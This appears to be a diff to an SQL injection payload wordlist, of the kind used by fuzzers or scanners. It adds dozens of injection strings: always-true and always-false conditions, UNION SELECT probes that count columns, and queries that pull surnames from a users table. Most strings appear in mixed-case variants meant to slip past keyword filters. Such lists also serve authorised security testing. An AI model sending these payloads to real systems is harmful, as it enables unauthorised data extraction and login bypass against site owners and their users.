@@ -11,6 +11,17 @@
  " union select 1,2,3--
  " uNiOn select 1,2,3--
  " union sElEct 1,2,3--
+ " or "1"="2"--"
+" oR "1"="2"--"
+" union select 1--"
+" uNiOn select 1--"
+" union sElEct 1--"
+" union select 1,2--"
+" uNiOn select 1,2--"
+ " union sElEct 1,2--"
+ " union select 1,2,3--"
+ " uNiOn select 1,2,3--"
+ " union sElEct 1,2,3--"
  ' and '1'='1
  ' and '1'='2
  ' or '1'='2'--
@@ -24,6 +35,17 @@
  ' union select 1,2,3--
  ' uNiOn select 1,2,3--
  ' union sElEct 1,2,3--
+ ' or '1'='2'--'
+ ' oR '1'='2'--'
+ ' union select 1--'
+ ' uNiOn select 1--'
+ ' union sElEct 1--'
+ ' union select 1,2--'
+ ' uNiOn select 1,2--'
+ ' union sElEct 1,2--'
+ ' union select 1,2,3--'
+ ' uNiOn select 1,2,3--'
+ ' union sElEct 1,2,3--'
  and 1=1#
  and 1=2#
  or 1=2#
@@ -49,6 +71,18 @@
  " union select surname,surname,surname from users--
  " uNiOn select surname,surname,surname from users--
  " union sElEct surname,surname,surname from users--
+ " or "1"="1"--"
+ " oR "1"="1"--"
+ " or "2"="2"--"
+ " union select surname from users--"
+ " uNiOn select surname from users--"
+ " union sElEct surname from users--"
+ " union select surname,surname from users--"
+ " uNiOn select surname,surname from users--"
+ " union sElEct surname,surname from users--"
+ " union select surname,surname,surname from users--"
+ " uNiOn select surname,surname,surname from users--"
+ " union sElEct surname,surname,surname from users--"
  ' or '1'='1'--
  ' oR '1'='1'--
  ' or '2'='2'--
@@ -61,6 +95,18 @@
  ' union select surname,surname,surname from users--
  ' uNiOn select surname,surname,surname from users--
  ' union sElEct surname,surname,surname from users--
+ ' or '1'='1'--
+ ' oR '1'='1'--
+ ' or '2'='2'--
+ ' union select surname from users--'
+ ' uNiOn select surname from users--'
+ ' union sElEct surname from users--'
+ ' union select surname,surname from users--'
+ ' uNiOn select surname,surname from users--'
+ ' union sElEct surname,surname from users--'
+ ' union select surname,surname,surname from users--'
+ ' uNiOn select surname,surname,surname from users--'
+ ' union sElEct surname,surname,surname from users--'
  or 1=1#
  oR 1=1#
  or 2=2#
